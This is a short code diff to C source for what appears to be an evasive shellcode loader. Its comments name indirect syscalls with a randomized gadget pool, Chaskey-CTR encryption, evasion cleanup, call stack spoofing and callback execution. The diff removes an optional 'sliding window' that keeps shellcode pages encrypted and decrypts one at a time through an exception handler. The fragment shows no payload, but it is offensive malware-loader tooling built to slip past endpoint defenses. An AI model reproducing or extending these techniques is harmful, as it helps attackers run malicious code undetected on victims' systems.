@@ -8,7 +8,6 @@
 // Syscalls: Indirect with randomized gadget pool
 // Crypto:   Chaskey-CTR (replaces RC4/SystemFunction032)
 // Compress: LZNT1 via ntdll (optional, per-build)
-// Window:   Sliding execution window (optional, per-page decryption)
 // =============================================
 
 #include "Common.h"
@@ -206,19 +205,6 @@ int Main(VOID) {
     CleanupEvasion(&WinApis);
     LOG("[+] Evasion cleanup complete");
 
-    // ============================================================
-    // Sliding Execution Window (optional)
-    //
-    // When SLIDING_WINDOW is defined, encrypt all shellcode pages
-    // and register a VEH that decrypts them on demand. Only one
-    // page is cleartext at any given time.
-    // ============================================================
-
-#ifdef SLIDING_WINDOW
-    if (!ActivateSlidingWindow(&WinApis, pExec, dwShellcodeSize)) {
-        LOG("[!] Sliding window activation failed, continuing without it");
-    }
-#endif
 
     // ============================================================
     // Stage 2: Call Stack Spoofing + Callback Execution
